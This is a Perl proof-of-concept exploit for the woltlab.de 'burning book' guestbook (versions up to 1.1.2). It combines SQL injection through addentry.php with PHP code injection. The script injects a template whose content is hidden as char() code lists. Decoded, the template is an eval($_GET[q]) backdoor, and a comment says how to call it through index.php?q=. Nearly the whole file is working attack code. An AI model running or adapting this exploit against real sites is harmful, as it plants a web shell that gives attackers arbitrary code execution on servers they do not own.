
#!/usr/bin/perl

# woltlab.de burning book <=1.1.2 SQL and PHP injection PoC
# use /index.php?q=phpinfo();exit;
# ShAnKaR sec[A]shankar.antichat.ru
# http://antichat.ru/

use LWP;
die("use ./burn-book.pl http://localhost/wbbook/ [1(number book db, default `1`)]\n") if !$ARGV[0];$ARGV[1]='' if !$ARGV[1];
my $ua=LWP::UserAgent->new();
$ua->post($ARGV[0].'/addentry.php',[reg_image=>0,send=>'send',name=>1,message=>1,
n=>$ARGV[1].'_templates (`templateid`,`templatename`,`template`) VALUES
(char(55,55,55),char(105,110,100,101,120,95,102,105,101,108,100,115),char(92,34,59,64,101,118,97,108,40,36,95,71,69,84,91,113,93,41,59,36,102,105,101,108
,100,115,61,92,34,60,98,114,32,47,62,60,117,62,36,102,105,101,108,100,116,105,116,108,101,60,47,117,62,58,32,36,102,105,101,108,100))/*',]);
